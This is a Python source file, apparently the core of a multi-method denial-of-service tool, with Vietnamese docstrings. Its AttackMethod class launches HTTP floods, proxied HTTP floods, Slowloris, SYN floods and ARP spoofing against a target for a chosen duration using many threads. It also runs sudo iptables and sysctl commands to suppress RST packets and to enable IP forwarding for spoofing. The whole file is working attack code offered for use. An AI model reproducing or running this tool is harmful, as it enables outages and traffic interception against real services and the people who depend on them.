from __future__ import annotations

import os
import socket
import sys
from threading import Thread
from time import sleep, time
from typing import Dict, Iterator, List, Tuple, Union

from colorama import Fore as F
from humanfriendly import Spinner, format_timespan

from tools.addons.ip_tools import get_host_ip, get_target_address
from tools.addons.sockets import create_socket, create_socket_proxy


class AttackMethod:
    """Kiểm soát các hoạt động nội bộ của cuộc tấn công."""

    def __init__(
        self,
        method_name: str,
        duration: int,
        threads: int,
        target: str,
        sleep_time: int = 15,
    ):
        """Khởi tạo đối tượng tấn công.

        Args:
            - method_name: Tên phương pháp DoS sử dụng để tấn công
            - duration: Thời gian tấn công, tính bằng giây
            - threads: Số lượng luồng sẽ tấn công mục tiêu
            - target: URL mục tiêu
            - sleep_time: Thời gian ngủ của các socket (chỉ áp dụng cho Slowloris)
        """
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.sleep_time = sleep_time
        self.threads = []
        self.is_running = False

    def get_method_by_name(self) -> None:
        """Lấy hàm flood dựa trên phương pháp tấn công.

        Args:
            None

        Returns:
            None
        """
        if self.method_name in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
            self.layer_number = 7
        elif self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
            )
            self.layer_number = 4
        elif self.method_name in ["arp-spoof", "disconnect"]:
            if self.method_name == "arp-spoof":
                os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
            self.layer_number = 2
        else:
            raise ValueError(f"Unknown method_name: {self.method_name}")

        directory = f"tools.L{self.layer_number}.{self.method_name}"
        module = __import__(directory, fromlist=["object"])
        self.method = getattr(module, "flood")

    def __enter__(self) -> AttackMethod:
        """Thiết lập hàm flood và các thuộc tính mục tiêu."""
        self.get_method_by_name()
        if self.layer_number != 2:
            self.target = get_target_address(self.target)
        return self

    def __exit__(self, exc_type, exc_value, traceback) -> None:
        """Khôi phục các biến mặc định của hệ thống."""
        if self.method_name == "syn-flood":
            os.system(
                f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
            )
        if self.method_name == "arp-spoof":
            os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")

    def __run_timer(self) -> None:
        """Kiểm tra thời gian thực thi mỗi giây."""
        __stop_time = time() + self.duration
        while time() < __stop_time:
            sleep(1)
        self.is_running = False

    def __slow_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """Chạy các phương pháp tấn công slowloris và slowloris-proxy."""
        try:
            if "proxy" in self.method_name:
                self.method(args[0], args[1])
            else:
                self.method(args[0])
        except (ConnectionResetError, BrokenPipeError) as e:
            print(f"{F.RED}[!] Error: {e}{F.RESET}")
            self.thread = Thread(
                target=self.__run_flood, args=create_socket_proxy(self.target)
            )
            self.thread.start()
        sleep(self.sleep_time)

    def __run_flood(
        self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
    ) -> None:
        """Bắt đầu quá trình flood."""
        while self.is_running:
            if "slowloris" in self.method_name:
                self.__slow_flood(*args)
            else:
                self.method(self.target)

    def __slow_threads(self) -> Iterator[Thread]:
        """Khởi tạo các luồng cho các cuộc tấn công slowloris và slowloris-proxy."""
        with Spinner(
            label=f"{F.YELLOW}Creating {self.threads_count} Socket(s)...{F.RESET}",
            total=100,
        ) as spinner:
            for index in range(self.threads_count):
                if "proxy" in self.method_name:
                    yield Thread(
                        target=self.__run_flood, args=create_socket_proxy(self.target)
                    )
                else:
                    yield Thread(
                        target=self.__run_flood, args=(create_socket(self.target),)
                    )
                spinner.step(100 / self.threads_count * (index + 1))

    def __start_threads(self) -> None:
        """Bắt đầu các luồng."""
        with Spinner(
            label=f"{F.YELLOW}Starting {self.threads_count} Thread(s){F.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

    def __run_threads(self) -> None:
        """Khởi tạo các luồng và bắt đầu chúng."""
        if "slowloris" in self.method_name:
            self.threads = list(self.__slow_threads())
        else:
            self.threads = [
                Thread(target=self.__run_flood) for _ in range(self.threads_count)
            ]

        self.__start_threads()

        # Bắt đầu đồng hồ thời gian sau khi tất cả các luồng đã được khởi chạy.
        Thread(target=self.__run_timer).start()

        # Đóng tất cả các luồng sau khi tấn công hoàn tất.
        for thread in self.threads:
            thread.join()

        print(f"{F.MAGENTA}\n\n[!] {F.BLUE}Attack Completed!\n\n{F.RESET}")

    def start(self) -> None:
        """Bắt đầu cuộc tấn công DoS."""
        duration = format_timespan(self.duration)

        print(
            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target} {F.BLUE}"
            f"using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
            f"[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
        )
        if "slowloris" in self.method_name:
            print(
                f"{F.MAGENTA}[!] {F.BLUE}Sockets that eventually went down are automatically recreated!\n\n{F.RESET}"
            )
        elif self.method_name == "http-proxy":
            print(
                f"{F.MAGENTA}[!] {F.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{F.RESET}"
            )

        self.is_running = True

        try:
            self.__run_threads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"{F.RED}\n\n[!] {F.MAGENTA}Ctrl+C detected. Stopping Attack...{F.RESET}"
            )

            for thread in self.threads:
                if thread.is_alive():
                    thread.join()

            print(f"{F.MAGENTA}\n[!] {F.BLUE}Attack Interrupted!\n\n{F.RESET}")
            sys.exit(1)
